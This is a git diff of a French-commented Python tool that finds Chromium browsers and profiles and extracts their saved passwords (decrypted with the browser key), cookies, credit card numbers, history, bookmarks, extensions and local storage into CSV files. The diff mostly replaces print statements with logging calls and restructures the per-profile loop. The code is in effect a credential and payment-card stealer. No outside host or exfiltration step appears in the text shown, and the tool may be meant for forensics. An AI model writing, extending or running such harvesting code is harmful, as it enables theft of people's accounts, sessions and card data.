@@ -16,7 +16,8 @@ def list_browsers():
     Répertorie les navigateurs Chromium installés sur le système, en différenciant les profils
     """
     global browsers
-    print("🔍 Recherche des navigateurs Chromium")
+    browsers = []
+    utils.add_to_log("🔍 Recherche des navigateurs Chromium")
     # Parcours de la liste des navigateurs
     for browser, paths in CHROMIUM_BROWSERS["browser"].items():
         if utils.IS_WINDOWS:
@@ -70,7 +71,7 @@ def get_encryption_key(local_state_path):
             )
 
     except Exception as e:
-        print(f"❌ Erreur récupération clé : {e}")
+        utils.add_to_log(f"❌ Erreur récupération clé : {e}", style="error")
         return None
 
 # Fonction pour déchiffrer un mot de passe
@@ -90,7 +91,7 @@ def decrypt_value(encrypted_password, key):
 
 # Fonction pour extraire les mots de passe stockés
 def extract_passwords(browser: Browser, profile: Profile = None):
-    print(f"Extraction des mots de passe")
+    utils.add_to_log(f"=== Extraction des mots de passe ===")
     login_dbs = []
 
     # Si un profil est spécifié, on ajoute le chemin des bdd de logins
@@ -136,18 +137,18 @@ def extract_passwords(browser: Browser, profile: Profile = None):
             os.remove(temp_db)
 
         except Exception as e:
-            print(f"❌ Erreur extraction {browser} : {e}")
+            utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")
 
 # Fonction pour extraire l'historique de navigation
 def extract_history(browser, profile: Profile = None):
-    print(f"Extraction de l'historique")
+    utils.add_to_log(f"=== Extraction de l'historique ===")
     if profile:
         history_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["history"]
     else:
         history_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["history"]
 
     if not history_db.exists():
-        print(f"❌ Fichier d'historique non présent")
+        utils.add_to_log(f"😒 Fichier d'historique non présent", style="info")
         return
 
     # Copie temporaire du fichier d'historique
@@ -167,24 +168,26 @@ def extract_history(browser, profile: Profile = None):
             "visit_count": visit_count,
             "last_visit_time": last_visit_time
             })
-        utils.write_to_csv(history_list, "history.csv", browser.name, profile.name)
+            
+        if history_list:
+            utils.write_to_csv(history_list, "history.csv", browser.name, profile.name)   
         
         conn.close()
         os.remove(temp_db)
 
     except Exception as e:
-        print(f"❌ Erreur extraction {browser} : {e}")        
+        utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")        
 
 # Fonction pour extraire l'historique des téléchargements
 def extract_download_history(browser, profile: Profile = None):
-    print(f"Extraction de l'historique des téléchargements")
+    utils.add_to_log(f"=== Extraction de l'historique des téléchargements ===")
     if profile:
         history_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["history"]
     else:
         history_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["history"]
 
     if not history_db.exists():
-        print(f"❌ Fichier d'historique non présent")
+        utils.add_to_log(f"😒 Fichier d'historique non présent", style="info")
         return
 
     # Copie temporaire du fichier d'historique
@@ -208,24 +211,26 @@ def extract_download_history(browser, profile: Profile = None):
                 "end_time": end_time,
                 "mime_type": mime_type
             })
-        utils.write_to_csv(download_history_list, "download_history.csv", browser.name, profile.name)
+            
+        if download_history_list:
+            utils.write_to_csv(download_history_list, "download_history.csv", browser.name, profile.name)
 
         conn.close()
         os.remove(temp_db)
 
     except Exception as e:
-        print(f"❌ Erreur extraction {browser} : {e}")
+        utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")
 
 # Extraction des cookies impossible des cookies en V20 impossible, on essaie de récupérer les cookies en V10 si il y en a
 def extract_cookies(browser, profile: Profile = None):
-    print(f"Extraction des cookies")
+    utils.add_to_log(f"=== Extraction des cookies ===")
     if profile:
         cookies_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["cookies"]
     else:
         cookies_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["cookies"]
 
         if not cookies_db.exists():
-            print(f"❌ Fichier de cookies non présent")
+            utils.add_to_log(f"😒 Fichier de cookies non présent", style="info")
             return
 
     # Copie temporaire du fichier de cookies
@@ -234,7 +239,7 @@ def extract_cookies(browser, profile: Profile = None):
     try:
         shutil.copy(cookies_db, temp_db)
     except Exception as e:
-        print(f"❌ Erreur copie fichier de cookies : {e}")
+        utils.add_to_log(f"❌ Erreur copie fichier de cookies : {e}", style="error")
         return
 
     try:
@@ -264,18 +269,18 @@ def extract_cookies(browser, profile: Profile = None):
         os.remove(temp_db)
 
     except Exception as e:
-        print(f"❌ Erreur extraction {browser} : {e}\n")
+        utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")
 
 # Fonction pour extraire les favoris
 def extract_bookmarks(browser, profile: Profile = None):
-    print(f"Extraction des favoris")
+    utils.add_to_log(f"=== Extraction des favoris ===")
     if profile:
         bookmarks_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["bookmarks"]
     else:
         bookmarks_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["bookmarks"]
 
     if not bookmarks_db.exists():
-        print(f"❌ Fichier de favoris non présent")
+        utils.add_to_log(f"😒 Fichier de favoris non présent", style="info")
         return
 
     # Copie temporaire du fichier de favoris
@@ -301,18 +306,18 @@ def extract_bookmarks(browser, profile: Profile = None):
         os.remove(temp_db)
 
     except Exception as e:
-        print(f"❌ Erreur extraction {browser} : {e}")
+        utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")
 
 # Fonction pour extraire les extensions
 def extract_extensions(browser, profile: Profile = None):
-    print(f"Extraction des extensions")
+    utils.add_to_log(f"=== Extraction des extensions ===")
     if profile:
         extensions_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["extensions"]
     else:
         extensions_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["extensions"]
 
     if not extensions_path.exists():
-        print(f"❌ Dossier d'extensions non présent")
+        utils.add_to_log(f"😒 Dossier d'extensions non présent", style="info")
         return
 
     # Copie temporaire du dossier d'extensions
@@ -332,7 +337,7 @@ def extract_extensions(browser, profile: Profile = None):
                                 extensions.append(parse_chromium_extension(manifest_content, id))
         utils.write_to_csv(extensions, "extensions.csv", browser.name, profile.name)
     except Exception as e:
-        print(f"❌ Erreur extraction : {e}")
+        utils.add_to_log(f"❌ Erreur extraction : {e}", style="error")
     finally:
         shutil.rmtree(temp_db, ignore_errors=True)
 
@@ -365,16 +370,15 @@ def get_chromium_ext_url(id, update_url):
     return ""
 
 # Fonction pour extraire les cartes de crédit
-# @TODO : Tester
 def extract_credit_cards(browser, profile: Profile = None):
-    print(f"Extraction des cartes de crédit")
+    utils.add_to_log(f"=== Extraction des cartes de crédit ===")
     if profile:
         credit_cards_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["credit_cards"]
     else:
         credit_cards_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["credit_cards"]
 
     if not credit_cards_db.exists():
-        print(f"❌ Fichier de cartes de crédit non présent")
+        utils.add_to_log(f"😒 Fichier de cartes de crédit non présent")
         return
 
     # Copie temporaire du fichier de cartes de crédit
@@ -398,25 +402,25 @@ def extract_credit_cards(browser, profile: Profile = None):
                 "card_number": card_number
             })
             
-        utils.write_to_csv(credit_card_list, "credit_cards.csv", browser.name, profile.name)
-
+        if credit_card_list:
+            utils.write_to_csv(credit_card_list, "credit_cards.csv", browser.name, profile.name)
 
         conn.close()
         os.remove(temp_db)
 
     except Exception as e:
-        print(f"❌ Erreur extraction {browser} : {e}")
+        utils.add_to_log(f"❌ Erreur extraction {browser} : {e}", style="error")
 
 # Fonction pour extraire le local storage
 def extract_local_storage(browser, profile: Profile = None):
-    print(f"Extraction du local storage")
+    utils.add_to_log(f"=== Extraction du local storage ===")
     if profile:
         local_storage_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["local_storage"]
     else:
         local_storage_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["local_storage"]
         
     if not local_storage_path.exists():
-        print(f"❌ Dossier de local storage non présent")
+        utils.add_to_log(f"😒 Dossier de local storage non présent", style="info")
         return
     
     temp_db = local_storage_path.with_suffix(".temp")
@@ -430,7 +434,7 @@ def extract_local_storage(browser, profile: Profile = None):
                     localstorage_content = json.load(file)
                     local_storage.append(parse_chromium_local_storage(localstorage_content))
     except Exception as e:
-        print(f"❌ Erreur extraction : {e}")
+        utils.add_to_log(f"❌ Erreur extraction : {e}", style="error")
     finally:
         shutil.rmtree(temp_db, ignore_errors=True)
         
@@ -448,45 +452,31 @@ def parse_chromium_local_storage(localstorage_content) -> dict:
 # Fonction pour extraire les données
 def extract_data():
     list_browsers()
-
+    
     if not browsers:
-        print("❌ Aucun navigateur trouvé\n")
+        utils.add_to_log("😰 Aucun navigateur Chromium trouvé", style="info")
         return
     else :
-        print(f"✅ {len(browsers)} navigateurs trouvés\n")
-
+        utils.add_to_log(f"✅ {len(browsers)} navigateurs trouvés", style="success")
+    
     for browser in browsers:
-        print(f"🤫 Extraction des données pour {browser}\n")
+        utils.add_to_log(f"🤫 Extraction des données pour {browser}", style="info")
 
-        # @TODO Ne pas appeler si on ne récupère pas les mots de passe ou les cartes de crédit
-        key = get_encryption_key(browser.local_state_path)
-        if key is None:
-            print(f"❌ Clé de chiffrement non trouvée pour {browser}")
-        else:
-            print(f"=== Clé de chiffrement trouvée pour {browser} ✅ ===")
-            browser.encryption_key = key
-
-        if not browser.profiles:
-            print(f"🔍 Extraction des données pour le profil par défaut")
+        for profile in browser.profiles or [None]:
+            profile_name = profile.name if profile else "par défaut"
+            utils.add_to_log(f"🔍 Extraction des données pour le profil {profile_name} sur le navigateur {browser}", style="info")
             for k, opt in OPTIONS.items():
                 if opt["active"]:
+                    # Récupération de la clé de chiffrement pour les mots de passe et les cartes de crédit
+                    if (k == "passwords" or k == "credit_cards") and not browser.encryption_key:
+                        utils.add_to_log(f"🔑 Récupération de la clé de chiffrement pour {browser}", style="info")
+                        key = get_encryption_key(browser.local_state_path)
+                        if key is None:
+                            utils.add_to_log(f"❌ Clé de chiffrement non trouvée pour {browser}", style="error")
+                        else:
+                            utils.add_to_log(f"Clé de chiffrement trouvée pour {browser} ✅", style="success")
+                            browser.encryption_key = key
                     func_name = f"extract_{k}"
                     func = globals().get(func_name)
                     if callable(func):
-                        func(browser)
-                    else:
-                        print(f"Fonction {func_name} introuvable.")
-
-        else:
-            for profile in browser.profiles:
-                print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
-                for k, opt in OPTIONS.items():
-                    if opt["active"]:
-                        func_name = f"extract_{k}"
-                        func = globals().get(func_name)
-                        if callable(func):
-                            func(browser, profile)
-                        else:
-                            print(f"Fonction {func_name} introuvable.")
-                        
-    print("✅ Extraction terminée")
+                        func(browser, profile)
